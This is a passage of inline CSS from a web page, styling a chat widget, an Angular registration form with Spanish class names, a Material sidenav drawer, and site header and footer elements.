    .cx-common-container.cx-mobile .cx-buttons-window-control>button:focus {
      padding: 3px
    }

    .cx-common-container.cx-mobile .cx-button-container .cx-text {
      margin: 16px 9px 16px 0
    }

    .cx-common-container.cx-mobile .cx-footer {
      border-width: 1px 0 0;
      border-style: solid;
      width: 100%;
      position: absolute;
      bottom: 0;
      left: 0
    }

    .cx-common-container.cx-mobile .cx-dialog-container {
      padding: 20px
    }
  </style>
  <style type="text/css">
    .cx-common-container.cx-close .cx-buttons-window-control button.cx-button-close,
    .cx-common-container.cx-minimize .cx-buttons-window-control button.cx-button-maximize,
    .cx-common-container.cx-minimize .cx-buttons-window-control button.cx-button-minimize {
      display: inline-block
    }
  </style>
  <style type="text/css">
    .cx-common-container.cx-overlay.cx-desktop {
      padding: 28px 48px 0;
      min-width: 688px;
      width: auto
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-button-group {
      padding-bottom: 0
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-titlebar {
      border: 0;
      padding: 0 0 17px
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-titlebar .cx-icon {
      float: left;
      width: 24px;
      height: 24px;
      margin-right: 12px;
      margin-top: 0
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-titlebar .cx-title {
      margin-top: 0;
      margin-left: 0;
      padding: 0;
      line-height: 1.75em;
      font-size: 1.5em
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-titlebar .cx-subtitle {
      font-size: .875em;
      line-height: 2.5em;
      clear: both
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-body {
      padding: 17px 0;
      min-height: 66px;
      border-width: 1px 0;
      border-style: solid
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-footer {
      padding: 8px 0 24px
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-button-container {
      margin-bottom: 12px
    }

    .cx-common-container.cx-overlay.cx-mobile {
      min-width: auto
    }

    .cx-common-container.cx-overlay.cx-mobile .cx-subtitle {
      font-size: .875em;
      line-height: 2.5em;
      clear: both
    }

    .cx-common-container.cx-overlay.cx-mobile .cx-footer {
      padding: 14px 24px 18px
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-portrait {
      padding: 0;
      height: 100%;
      width: 100%
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-portrait .cx-close {
      padding: 4px 8px;
      font-size: 1.5em
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-portrait .cx-body {
      max-height: none;
      padding: 16px 24px 17px;
      border-width: 1px 0;
      border-style: solid
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-portrait .cx-body .cx-wrapper {
      height: 100%;
      max-height: none
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-portrait .cx-button-container .cx-button-group .cx-btn {
      margin: 8px 24px
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-landscape {
      height: 100%;
      width: 100%;
      padding: 0
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-landscape .cx-close {
      padding: 4px 8px;
      font-size: 1.5em
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-landscape .cx-body {
      border-width: 0;
      border-style: solid;
      padding: 16px 24px 17px;
      border-top: 0
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-landscape .cx-body .wrapper {
      max-height: none;
      height: 100%
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-landscape .cx-button-container .cx-button-group .cx-btn {
      height: 32px;
      margin: 8px 24px
    }

    @media screen and (max-width:1099px) and (min-width:650px) {
      .cx-common-container.cx-overlay.cx-desktop {
        min-width: 550.4px
      }
    }
  </style>
  <style type="text/css">
    .cx-common-container.cx-toast .cx-button-container {
      padding: 0 24px
    }
  </style>
  <style type="text/css">
    .cx-common-container.cx-loading .cx-loading-screen,
    .cx-common-container.cx-loading .cx-smokescreen {
      display: block
    }

    .cx-common-container.cx-waiting .cx-loading-screen {
      display: block;
      pointer-events: none;
      background: none
    }

    .cx-loading-screen {
      display: none;
      position: absolute;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%
    }

    .cx-loading-container {
      display: none;
      position: relative
    }

    .cx-loading-container .cx-loading-icon,
    .cx-loading-screen .cx-loading-icon {
      display: inline-block;
      height: 50px;
      width: 50px;
      left: -25px;
      margin-left: 50%;
      position: relative;
      top: 50%;
      -webkit-transform: translateY(-50%);
      -ms-transform: translateY(-50%);
      transform: translateY(-50%)
    }

    .cx-loading-container svg,
    .cx-loading-screen svg {
      -webkit-animation: cxloadingspin 4s linear infinite;
      -moz-animation: cxloadingspin 4s linear infinite;
      animation: cxloadingspin 4s linear infinite
    }

    @-moz-keyframes cxloadingspin {
      0% {
        -moz-transform: rotate(0deg)
      }

      to {
        -moz-transform: rotate(1turn)
      }
    }

    @-webkit-keyframes cxloadingspin {
      0% {
        -webkit-transform: rotate(0deg)
      }

      to {
        -webkit-transform: rotate(1turn)
      }
    }

    @keyframes cxloadingspin {
      0% {
        transform: rotate(0deg)
      }

      to {
        transform: rotate(1turn)
      }
    }

    .cx-common-container,
    .cx-drop-shadow {
      -webkit-box-shadow: 0 0 21px 2px rgba(0, 0, 0, .2);
      box-shadow: 0 0 21px 2px rgba(0, 0, 0, .2)
    }

    .cx-common-container {
      box-sizing: border-box;
      -moz-box-sizing: border-box;
      -webkit-box-sizing: border-box
    }

    .cx-common-container button,
    .cx-common-container form {
      outline: none
    }

    .cx-common-container * {
      box-sizing: border-box;
      -moz-box-sizing: border-box;
      -webkit-box-sizing: border-box
    }

    .cx-common-container ::-webkit-scrollbar {
      width: 5px;
      height: 5px
    }

    .cx-common-container .cx-titlebar {
      clear: both;
      border-width: 0 0 1px;
      border-style: solid;
      padding: 14px 20px;
      background-color: inherit
    }

    .cx-common-container .cx-titlebar .cx-icon {
      float: left;
      width: 24px;
      height: 24px;
      margin-top: 2px
    }

    .cx-common-container .cx-titlebar .cx-title {
      display: inline-block;
      font-size: 1.5em;
      margin: 0 0 0 8px;
      font-weight: lighter
    }

    .cx-common-container .cx-titlebar .cx-close {
      float: right
    }

    .cx-common-container .cx-titlebar .cx-close .cx-button-close {
      font-size: 1em
    }

    .cx-common-container .cx-body {
      padding: 24px 24px 0;
      overflow: auto;
      clear: both;
      position: relative
    }

    .cx-common-container .cx-body ::-webkit-scrollbar {
      width: 5px;
      height: 5px
    }

    .cx-common-container .cx-button-container {
      font-size: .75em;
      line-height: 1em
    }

    .cx-common-container .cx-button-container .cx-button-group .cx-btn {
      margin: 12px 0 0
    }

    .cx-common-container .cx-button-container .cx-button-group .cx-text {
      margin: 20px 0;
      line-height: 1em
    }

    .cx-common-container .cx-dialog-container,
    .cx-common-container .cx-smokescreen {
      position: absolute;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      display: none
    }

    .cx-common-container .cx-dialog-container {
      padding: 48px 96px;
      font-size: .875em
    }

    .cx-common-container .cx-dialog-container .cx-dialog {
      border: 1px solid;
      padding: 24px;
      top: 28px;
      position: relative;
      display: none
    }

    .cx-common-container .cx-footer {
      padding: 14px 24px 18px;
      background-color: inherit
    }

    .cx-common-container .cx-footer .cx-powered-by {
      font-size: .625em
    }

    .cx-common-container .cx-branding {
      padding: 10px 12px 26px 15px
    }

    .cx-common-container .cx-branding .cx-icon {
      float: left;
      width: 16px;
      height: 16px
    }

    .cx-common-container .cx-email-link {
      font-weight: 700
    }

    .cx-common-container .cx-powered-by .cx-icon {
      position: relative;
      top: 2px
    }

    .cx-common-container .cx-powered-by .cx-icon svg {
      width: 59px;
      height: 14px
    }

    .cx-common-container .cx-buttons-window-control {
      position: absolute;
      top: 12px;
      right: 12px;
      font-size: 1em;
      overflow: hidden
    }

    .cx-common-container .cx-buttons-window-control button {
      display: none;
      padding: 0;
      background-color: transparent;
      border: 0;
      width: 20px;
      height: 20px;
      padding: 2px;
      margin-left: 6px
    }

    .cx-common-container .cx-buttons-window-control button:focus {
      border: 1px solid;
      border-width: 2px;
      padding: 1px
    }

    .cx-footer .cx-button-group .cx-button-group {
      margin-bottom: 0
    }

    .cx-button-group {
      overflow: auto
    }

    .cx-buttons-single {
      text-align: center
    }

    .cx-buttons-single .cx-btn-default,
    .cx-buttons-single .cx-btn-primary {
      float: none
    }

    .cx-buttons-binary .cx-btn-primary {
      float: right
    }

    .cx-buttons-binary .cx-btn-default {
      float: left
    }

    .cx-buttons-primary .cx-btn-primary {
      float: right
    }

    .cx-buttons-primary .cx-text {
      float: left;
      margin-left: 16px
    }

    .cx-buttons-default .cx-btn-default {
      float: left
    }

    .cx-buttons-default .cx-text {
      float: right;
      margin-right: 16px
    }

    .cx-common-container.cx-close .cx-buttons-window-control button.cx-button-close,
    .cx-common-container.cx-minimize .cx-buttons-window-control button.cx-button-maximize,
    .cx-common-container.cx-minimize .cx-buttons-window-control button.cx-button-minimize {
      display: inline-block
    }

    .cx-common-container.cx-minimized .cx-buttons-window-control .cx-button-maximize svg {
      -ms-transform: rotate(180deg);
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg);
      border-bottom: 1px transparent
    }

    .cx-common-container.cx-mobile .cx-btn {
      padding: 5px 14px
    }

    .cx-common-container.cx-mobile .cx-titlebar {
      padding: 9px 11px
    }

    .cx-common-container.cx-mobile .cx-titlebar .cx-icon {
      margin-left: 13px
    }

    .cx-common-container.cx-mobile .cx-buttons-window-control {
      top: 7px;
      right: 0;
      overflow: visible !important
    }

    .cx-common-container.cx-mobile .cx-buttons-window-control>button {
      margin-right: 10px;
      padding: 4px;
      width: 24px;
      height: 32px
    }

    .cx-common-container.cx-mobile .cx-buttons-window-control>button:focus {
      padding: 3px
    }

    .cx-common-container.cx-mobile .cx-button-container .cx-text {
      margin: 16px 9px 16px 0
    }

    .cx-common-container.cx-mobile .cx-footer {
      border-width: 1px 0 0;
      border-style: solid;
      width: 100%;
      position: absolute;
      bottom: 0;
      left: 0
    }

    .cx-common-container.cx-mobile .cx-dialog-container {
      padding: 20px
    }
  </style>
  <style type="text/css">
    .cx-common-container.cx-close .cx-buttons-window-control button.cx-button-close,
    .cx-common-container.cx-minimize .cx-buttons-window-control button.cx-button-maximize,
    .cx-common-container.cx-minimize .cx-buttons-window-control button.cx-button-minimize {
      display: inline-block
    }
  </style>
  <style type="text/css">
    .cx-common-container.cx-overlay.cx-desktop {
      padding: 28px 48px 0;
      min-width: 688px;
      width: auto
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-button-group {
      padding-bottom: 0
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-titlebar {
      border: 0;
      padding: 0 0 17px
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-titlebar .cx-icon {
      float: left;
      width: 24px;
      height: 24px;
      margin-right: 12px;
      margin-top: 0
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-titlebar .cx-title {
      margin-top: 0;
      margin-left: 0;
      padding: 0;
      line-height: 1.75em;
      font-size: 1.5em
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-titlebar .cx-subtitle {
      font-size: .875em;
      line-height: 2.5em;
      clear: both
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-body {
      padding: 17px 0;
      min-height: 66px;
      border-width: 1px 0;
      border-style: solid
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-footer {
      padding: 8px 0 24px
    }

    .cx-common-container.cx-overlay.cx-desktop .cx-button-container {
      margin-bottom: 12px
    }

    .cx-common-container.cx-overlay.cx-mobile {
      min-width: auto
    }

    .cx-common-container.cx-overlay.cx-mobile .cx-subtitle {
      font-size: .875em;
      line-height: 2.5em;
      clear: both
    }

    .cx-common-container.cx-overlay.cx-mobile .cx-footer {
      padding: 14px 24px 18px
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-portrait {
      padding: 0;
      height: 100%;
      width: 100%
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-portrait .cx-close {
      padding: 4px 8px;
      font-size: 1.5em
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-portrait .cx-body {
      max-height: none;
      padding: 16px 24px 17px;
      border-width: 1px 0;
      border-style: solid
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-portrait .cx-body .cx-wrapper {
      height: 100%;
      max-height: none
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-portrait .cx-button-container .cx-button-group .cx-btn {
      margin: 8px 24px
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-landscape {
      height: 100%;
      width: 100%;
      padding: 0
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-landscape .cx-close {
      padding: 4px 8px;
      font-size: 1.5em
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-landscape .cx-body {
      border-width: 0;
      border-style: solid;
      padding: 16px 24px 17px;
      border-top: 0
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-landscape .cx-body .wrapper {
      max-height: none;
      height: 100%
    }

    .cx-common-container.cx-overlay.cx-mobile.cx-landscape .cx-button-container .cx-button-group .cx-btn {
      height: 32px;
      margin: 8px 24px
    }

    @media screen and (max-width:1099px) and (min-width:650px) {
      .cx-common-container.cx-overlay.cx-desktop {
        min-width: 550.4px
      }
    }
  </style>
  <style type="text/css">
    .cx-common-container.cx-toast .cx-button-container {
      padding: 0 24px
    }
  </style>
  <style>
    label[_ngcontent-serverApp-c1557493016] {
      color: #002361;
      font-weight: 600
    }

    .form-group[_ngcontent-serverApp-c1557493016] {
      margin-top: 1rem
    }

    .form-group[_ngcontent-serverApp-c1557493016] .form-control[_ngcontent-serverApp-c1557493016],
    .form-group[_ngcontent-serverApp-c1557493016] .form-control[_ngcontent-serverApp-c1557493016]::placeholder {
      background-color: #eceef2;
      font-size: 12px;
      height: 41px;
      color: #737374
    }

    .form-group[_ngcontent-serverApp-c1557493016] input[type=radio][_ngcontent-serverApp-c1557493016] {
      height: 14.5px;
      width: 14.5px
    }

    .form-group[_ngcontent-serverApp-c1557493016] input[type=radio][_ngcontent-serverApp-c1557493016]:checked {
      background-color: red
    }

    .form-group-radio[_ngcontent-serverApp-c1557493016] {
      display: flex;
      flex-direction: column
    }

    .form-group-radio[_ngcontent-serverApp-c1557493016] label[_ngcontent-serverApp-c1557493016] {
      margin-top: 0 !important;
      color: #002361;
      font-weight: 500
    }

    .form-group-radio[_ngcontent-serverApp-c1557493016] mat-radio-group[_ngcontent-serverApp-c1557493016] {
      display: flex;
      gap: 6rem
    }

    .button-container[_ngcontent-serverApp-c1557493016] {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      flex-wrap: wrap;
      gap: 2rem;
      margin-top: 115px
    }

    .button-container[_ngcontent-serverApp-c1557493016] button[_ngcontent-serverApp-c1557493016] {
      background-color: #00ae42;
      border-radius: 5px !important;
      font-size: 15px;
      font-weight: 600;
      width: 90%;
      color: #fff;
      max-width: 230px;
      height: 50px;
      border: none;
      cursor: pointer
    }

    .button-container[_ngcontent-serverApp-c1557493016] button.btn-link[_ngcontent-serverApp-c1557493016] {
      background-color: transparent;
      color: #002361;
      font-weight: 400
    }

    .button-container[_ngcontent-serverApp-c1557493016] button.btn-link[_ngcontent-serverApp-c1557493016]:hover {
      background-color: transparent;
      cursor: pointer
    }

    .button-container[_ngcontent-serverApp-c1557493016] button.btn-link[_ngcontent-serverApp-c1557493016]:disabled {
      background-color: transparent;
      cursor: default
    }

    .button-container[_ngcontent-serverApp-c1557493016] button[_ngcontent-serverApp-c1557493016]:hover {
      background-color: #009037
    }

    .button-container[_ngcontent-serverApp-c1557493016] button[disabled][_ngcontent-serverApp-c1557493016] {
      background-color: #05a743;
      cursor: default
    }

    .btn-cancel[_ngcontent-serverApp-c1557493016] {
      background-color: #c4c4c4 !important
    }

    select[_ngcontent-serverApp-c1557493016] {
      height: 30px;
      cursor: pointer
    }

    .select-container[_ngcontent-serverApp-c1557493016] {
      position: relative
    }

    .select-container[_ngcontent-serverApp-c1557493016]:after {
      content: url(down_arrow.4c76fbb02245b074.svg);
      position: absolute;
      right: 14px;
      top: 31%;
      transform: scale(.7)
    }

    @media screen and (max-width: 800px) {
      .form-group-radio[_ngcontent-serverApp-c1557493016] label[_ngcontent-serverApp-c1557493016] {
        color: #656565 !important;
        font-size: 10px
      }

      button[_ngcontent-serverApp-c1557493016] {
        width: 90%
      }

      .button-container[_ngcontent-serverApp-c1557493016] {
        margin-top: 20px
      }
    }

    .recaptcha[_ngcontent-serverApp-c1557493016] {
      display: flex;
      justify-content: center;
      margin: 2em
    }

    .registration[_ngcontent-serverApp-c1557493016] {
      background-color: #eceef2;
      padding: 4em 20em;
      display: flex;
      justify-content: center
    }

    .registrofrom[_ngcontent-serverApp-c1557493016] {
      background-color: #fff;
      border-radius: 15px
    }

    .containerregistro[_ngcontent-serverApp-c1557493016] {
      padding: 2em 8em
    }

    .containerform[_ngcontent-serverApp-c1557493016] {
      display: grid;
      grid-template-columns: 1fr 1fr 1fr;
      justify-items: center;
      align-items: center
    }

    .title_form[_ngcontent-serverApp-c1557493016] {
      font-size: 18px;
      color: #002361;
      display: flex;
      justify-content: center;
      margin: 1.5em
    }

    .form-control[_ngcontent-serverApp-c1557493016]::placeholder {
      color: #797474
    }

    .colorblue[_ngcontent-serverApp-c1557493016] {
      color: #002361
    }

    .btn-orange[_ngcontent-serverApp-c1557493016] {
      width: 30%;
      height: 35px;
      border-radius: 5px
    }

    .textregister[_ngcontent-serverApp-c1557493016] {
      color: #002361;
      font-size: 12px;
      margin: .3em 0
    }

    .aceptterms[_ngcontent-serverApp-c1557493016] {
      display: grid;
      grid-template-columns: .1fr 2fr;
      align-items: center
    }

    .form-control[_ngcontent-serverApp-c1557493016] {
      background-color: #eceef2;
      font-size: 12px;
      height: 41px;
      color: #737374
    }

    .bannerregist[_ngcontent-serverApp-c1557493016] {
      border-radius: 15px 15px 0 0 !important;
      width: 100%
    }

    .form-control.is-invalid[_ngcontent-serverApp-c1557493016] {
      border-color: #dc3545 !important
    }

    .form-control.is-valid[_ngcontent-serverApp-c1557493016] {
      border-color: #28a745 !important
    }

    .selected-item[_ngcontent-serverApp-c1557493016] {
      appearance: none
    }

    .click-limits[_ngcontent-serverApp-c1557493016] {
      font-weight: 1000;
      color: #fff;
      cursor: pointer
    }

    .radio-button-pep[_ngcontent-serverApp-c1557493016] {
      margin-right: 370px
    }

    .error[_ngcontent-serverApp-c1557493016] {
      position: absolute
    }

    .form-error[_ngcontent-serverApp-c1557493016] {
      color: red;
      text-align: justify;
      font-size: 9px
    }

    select.form-control[_ngcontent-serverApp-c1557493016] {
      padding-right: 0;
      padding-top: 4px
    }

    .select-placeholder[_ngcontent-serverApp-c1557493016] {
      color: #c4c4c4
    }

    .selected-value[_ngcontent-serverApp-c1557493016] {
      appearance: none
    }

    *[_ngcontent-serverApp-c1557493016],
    *[_ngcontent-serverApp-c1557493016]:before {
      box-sizing: border-box
    }

    .containerinput[_ngcontent-serverApp-c1557493016] {
      margin: 1em .5em
    }

    .suggestion-box[_ngcontent-serverApp-c1557493016] {
      position: absolute;
      z-index: 100;
      width: calc(8rem + 7vw);
      padding: .5em;
      background-color: #eceef2
    }

    .textgris[_ngcontent-serverApp-c1557493016] {
      color: #b1b1b1
    }

    .containerpromos[_ngcontent-serverApp-c1557493016] {
      display: grid;
      grid-template-columns: 1fr 1fr;
      padding: 3em 0
    }

    .btregister[_ngcontent-serverApp-c1557493016] {
      display: flex;
      padding: 2em;
      flex-direction: column;
      align-items: center
    }

    .tratamiendodt[_ngcontent-serverApp-c1557493016]:hover {
      cursor: pointer;
      text-decoration-line: underline
    }

    .mycheck[_ngcontent-serverApp-c1557493016] {
      margin: .8em;
      appearance: none;
      width: 18px;
      height: 18px;
      border: 1px solid #888;
      border-radius: 3px;
      cursor: pointer
    }

    .mycheck[_ngcontent-serverApp-c1557493016]:checked {
      background-image: url(checkterms.9b8ecf399a0f2fff.svg);
      background-repeat: no-repeat;
      border: none
    }

    .droptitle[_ngcontent-serverApp-c1557493016] {
      color: #002361;
      font-size: 10px
    }

    .droptext[_ngcontent-serverApp-c1557493016] {
      font-size: 10px;
      color: #737374
    }

    .btninfo[_ngcontent-serverApp-c1557493016] {
      display: flex;
      justify-content: flex-end;
      margin: 0 0 -8px
    }

    .interdicto[_ngcontent-serverApp-c1557493016] {
      padding: .5em;
      width: 200px;
      height: 100px
    }

    .textinfo[_ngcontent-serverApp-c1557493016] {
      padding: 0 .5em
    }

    @media screen and (max-width: 1300px) {
      .containerform[_ngcontent-serverApp-c1557493016] {
        grid-template-columns: 1fr 1fr
      }

      .registration[_ngcontent-serverApp-c1557493016] {
        padding: 5em 10em;
        display: block
      }

      .containerregistro[_ngcontent-serverApp-c1557493016] {
        padding: 2em 4em
      }

      .suggestion-box[_ngcontent-serverApp-c1557493016] {
        width: calc(14rem + 8vw)
      }

      .btn-orange[_ngcontent-serverApp-c1557493016] {
        width: 50%
      }
    }

    @media screen and (max-width: 760px) {
      .containerform[_ngcontent-serverApp-c1557493016] {
        grid-template-columns: 1fr;
        justify-content: center
      }

      .registration[_ngcontent-serverApp-c1557493016] {
        padding: 2em
      }

      .containerregistro[_ngcontent-serverApp-c1557493016] {
        padding: 1em
      }

      .title_form[_ngcontent-serverApp-c1557493016] {
        margin: 2em 1em
      }

      .suggestion-box[_ngcontent-serverApp-c1557493016] {
        width: calc(14rem + 2vw)
      }

      .containerpromos[_ngcontent-serverApp-c1557493016] {
        grid-template-columns: 1fr
      }

      .btn-orange[_ngcontent-serverApp-c1557493016] {
        width: 50%
      }

      .mycheck[_ngcontent-serverApp-c1557493016] {
        margin: .6em
      }

      .error[_ngcontent-serverApp-c1557493016] {
        max-width: 220px
      }

      .containerinput[_ngcontent-serverApp-c1557493016] {
        margin: 1.5em .5em
      }
    }
  </style>
  <style>
    .mat-drawer-container {
      position: relative;
      z-index: 1;
      color: var(--mat-sidenav-content-text-color);
      background-color: var(--mat-sidenav-content-background-color);
      box-sizing: border-box;
      -webkit-overflow-scrolling: touch;
      display: block;
      overflow: hidden
    }

    .mat-drawer-container[fullscreen] {
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      position: absolute
    }

    .mat-drawer-container[fullscreen].mat-drawer-container-has-open {
      overflow: hidden
    }

    .mat-drawer-container.mat-drawer-container-explicit-backdrop .mat-drawer-side {
      z-index: 3
    }

    .mat-drawer-container.ng-animate-disabled .mat-drawer-backdrop,
    .mat-drawer-container.ng-animate-disabled .mat-drawer-content,
    .ng-animate-disabled .mat-drawer-container .mat-drawer-backdrop,
    .ng-animate-disabled .mat-drawer-container .mat-drawer-content {
      transition: none
    }

    .mat-drawer-backdrop {
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      position: absolute;
      display: block;
      z-index: 3;
      visibility: hidden
    }

    .mat-drawer-backdrop.mat-drawer-shown {
      visibility: visible;
      background-color: var(--mat-sidenav-scrim-color)
    }

    .mat-drawer-transition .mat-drawer-backdrop {
      transition-duration: 400ms;
      transition-timing-function: cubic-bezier(0.25, 0.8, 0.25, 1);
      transition-property: background-color, visibility
    }

    .cdk-high-contrast-active .mat-drawer-backdrop {
      opacity: .5
    }

    .mat-drawer-content {
      position: relative;
      z-index: 1;
      display: block;
      height: 100%;
      overflow: auto
    }

    .mat-drawer-transition .mat-drawer-content {
      transition-duration: 400ms;
      transition-timing-function: cubic-bezier(0.25, 0.8, 0.25, 1);
      transition-property: transform, margin-left, margin-right
    }

    .mat-drawer {
      box-shadow: 0px 8px 10px -5px rgba(0, 0, 0, 0.2), 0px 16px 24px 2px rgba(0, 0, 0, 0.14), 0px 6px 30px 5px rgba(0, 0, 0, 0.12);
      position: relative;
      z-index: 4;
      --mat-sidenav-container-shape: 0;
      color: var(--mat-sidenav-container-text-color);
      background-color: var(--mat-sidenav-container-background-color);
      border-top-right-radius: var(--mat-sidenav-container-shape);
      border-bottom-right-radius: var(--mat-sidenav-container-shape);
      display: block;
      position: absolute;
      top: 0;
      bottom: 0;
      z-index: 3;
      outline: 0;
      box-sizing: border-box;
      overflow-y: auto;
      transform: translate3d(-100%, 0, 0)
    }

    .cdk-high-contrast-active .mat-drawer,
    .cdk-high-contrast-active [dir=rtl] .mat-drawer.mat-drawer-end {
      border-right: solid 1px currentColor
    }

    .cdk-high-contrast-active [dir=rtl] .mat-drawer,
    .cdk-high-contrast-active .mat-drawer.mat-drawer-end {
      border-left: solid 1px currentColor;
      border-right: none
    }

    .mat-drawer.mat-drawer-side {
      z-index: 2
    }

    .mat-drawer.mat-drawer-end {
      right: 0;
      transform: translate3d(100%, 0, 0);
      border-top-left-radius: var(--mat-sidenav-container-shape);
      border-bottom-left-radius: var(--mat-sidenav-container-shape);
      border-top-right-radius: 0;
      border-bottom-right-radius: 0
    }

    [dir=rtl] .mat-drawer {
      border-top-left-radius: var(--mat-sidenav-container-shape);
      border-bottom-left-radius: var(--mat-sidenav-container-shape);
      border-top-right-radius: 0;
      border-bottom-right-radius: 0;
      transform: translate3d(100%, 0, 0)
    }

    [dir=rtl] .mat-drawer.mat-drawer-end {
      border-top-right-radius: var(--mat-sidenav-container-shape);
      border-bottom-right-radius: var(--mat-sidenav-container-shape);
      border-top-left-radius: 0;
      border-bottom-left-radius: 0;
      left: 0;
      right: auto;
      transform: translate3d(-100%, 0, 0)
    }

    .mat-drawer[style*="visibility: hidden"] {
      display: none
    }

    .mat-drawer-side {
      box-shadow: none;
      border-right-color: var(--mat-sidenav-container-divider-color);
      border-right-width: 1px;
      border-right-style: solid
    }

    .mat-drawer-side.mat-drawer-end {
      border-left-color: var(--mat-sidenav-container-divider-color);
      border-left-width: 1px;
      border-left-style: solid;
      border-right: none
    }

    [dir=rtl] .mat-drawer-side {
      border-left-color: var(--mat-sidenav-container-divider-color);
      border-left-width: 1px;
      border-left-style: solid;
      border-right: none
    }

    [dir=rtl] .mat-drawer-side.mat-drawer-end {
      border-right-color: var(--mat-sidenav-container-divider-color);
      border-right-width: 1px;
      border-right-style: solid;
      border-left: none
    }

    .mat-drawer-inner-container {
      width: 100%;
      height: 100%;
      overflow: auto;
      -webkit-overflow-scrolling: touch
    }

    .mat-sidenav-fixed {
      position: fixed
    }
  </style>
  <style>
    .headerloginresponsive[_ngcontent-serverApp-c3829797790] {
      display: none
    }

    .headerlogin[_ngcontent-serverApp-c3829797790] {
      display: block
    }

    .vip-header[_ngcontent-serverApp-c3829797790] {
      background-color: #141c27;
      height: 78px;
      display: flex;
      align-items: center
    }

    .vip-header-navs[_ngcontent-serverApp-c3829797790] {
      width: 100%
    }

    .vip-menu-button[_ngcontent-serverApp-c3829797790] {
      background-color: #213045
    }

    .vip-menu-button[_ngcontent-serverApp-c3829797790]:hover {
      background-color: #10171d
    }

    .btn-inicio[_ngcontent-serverApp-c3829797790] {
      border: 1px solid #3cb4e5;
      background: #002361;
      color: #fff;
      max-width: 120px;
      height: 35px !important;
      border-radius: 3px
    }

    .btn-inicio[_ngcontent-serverApp-c3829797790]:hover {
      transform: scale(1.1)
    }

    .btn-registro[_ngcontent-serverApp-c3829797790] {
      color: #002361;
      background-color: #3cb4e5;
      border: none;
      max-width: 120px;
      height: 35px !important;
      border-radius: 3px
    }

    .btn-registro[_ngcontent-serverApp-c3829797790]:hover {
      transform: scale(1.1)
    }

    @media (max-width: 662px) {
      .headerlogin[_ngcontent-serverApp-c3829797790] {
        display: none
      }

      .headerloginresponsive[_ngcontent-serverApp-c3829797790] {
        display: block
      }

      .vip-header[_ngcontent-serverApp-c3829797790] {
        height: 98px
      }
    }

    @media only screen and (min-width: 662px) and (max-width: 800px) {
      .headerlogin[_ngcontent-serverApp-c3829797790] {
        display: none
      }

      .headerloginresponsive[_ngcontent-serverApp-c3829797790] {
        display: flex
      }
    }
  </style>
  <style>
    .footer[_ngcontent-serverApp-c3637729144] {
      background-color: #001849;
      color: #fff;
      padding: 70px 100px;
      transition: all .3s ease
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-content[_ngcontent-serverApp-c3637729144] {
      max-width: 1400px;
      margin: auto
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] {
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      padding: 10px 0;
      flex-wrap: wrap
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] {
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
      flex: 1
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] {
      padding: 10px;
      border-radius: 8px;
      width: 220px;
      transition: all .3s
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section.inactive-section[_ngcontent-serverApp-c3637729144] {
      opacity: .3
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] .footer-header[_ngcontent-serverApp-c3637729144] {
      display: flex;
      align-items: center;
      justify-content: space-between;
      cursor: pointer;
      padding: 5px 10px;
      transition: all .3s ease
    }

    .footer[_ngcontent-serverApp-c3637729144] .footer-top[_ngcontent-serverApp-c3637729144] .footer-links[_ngcontent-serverApp-c3637729144] .footer-section[_ngcontent-serverApp-c3637729144] .footer-title[_ngcontent-serverApp-c3637729144] {
      font-weight: 700;
      margin: 0;
      color: var(--Paleta-Marca-2, #5fb3e1)
    }

